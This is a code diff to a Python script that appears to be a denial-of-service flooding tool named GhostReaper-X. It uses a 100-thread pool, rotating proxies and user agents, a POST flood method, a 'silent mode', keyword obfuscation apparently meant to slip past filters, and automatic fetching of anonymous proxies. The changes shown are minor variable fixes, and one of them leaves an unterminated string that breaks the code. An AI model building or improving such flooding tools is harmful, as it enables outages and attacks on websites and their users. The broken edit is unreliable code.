@@ -42,6 +42,7 @@ semaphore = threading.Semaphore(100)
 silent_mode = False
 log_file = None
 stop_event = threading.Event()
+log_file_path = None  # Add this line to define log_file_path
 
 # Load proxies and user agents
 def load_list(file):
@@ -289,7 +290,7 @@ def launch_ghost_sequence():
     flood_method = "POST"
     failover_monitoring = True
     silent_mode = False
-    log_file = None
+    log_file_path = None  # Ensure log_file_path is defined
 
     print("\nReady to launch GhostReaper-X Sequence")
     print(f"Target     : {target}")
@@ -379,7 +380,8 @@ def print_status():
 # Additional functions for enhanced capabilities
 
 def obfuscate(data):
-    return data.replace("script", "scr"+"ipt").replace("admin", "a"+"dmin")
+    return data.replace("script", "
+    return data.replace("admin", "a"+"dmin")
 
 def fetch_proxies_online():
     url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
